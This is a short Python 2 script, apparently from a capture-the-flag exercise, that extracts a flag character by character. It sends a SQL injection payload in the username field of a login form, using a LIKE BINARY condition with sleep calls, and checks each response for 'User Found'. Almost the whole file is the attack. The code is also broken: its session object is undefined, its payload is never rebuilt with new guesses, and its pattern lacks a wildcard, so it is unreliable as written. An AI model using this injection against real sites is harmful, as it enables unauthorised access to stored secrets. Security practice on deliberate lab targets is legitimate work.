import requests
import time as t


passstr=""
#data={"username":'admin" AND IF(password  LIKE BINARY "flag{'+passstr+'}",sleep(1),sleep(0)) AND "1=1',"action":"submit"}


password = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
data={"username":'admin" AND IF(password  LIKE BINARY "flag{'+passstr+'}",sleep(1),sleep(0)) AND "1=1',"action":"submit",}
while True:
	for p in password:
		temp = passstr + p
		print temp
		r = s.post('<url>',data,verify=False)

		if "User Found" in r.text: 
			print "success"
			passstr = passstr + p;
			print "\n\n"+passstr+"\n\n"
			print "--------------------"
		
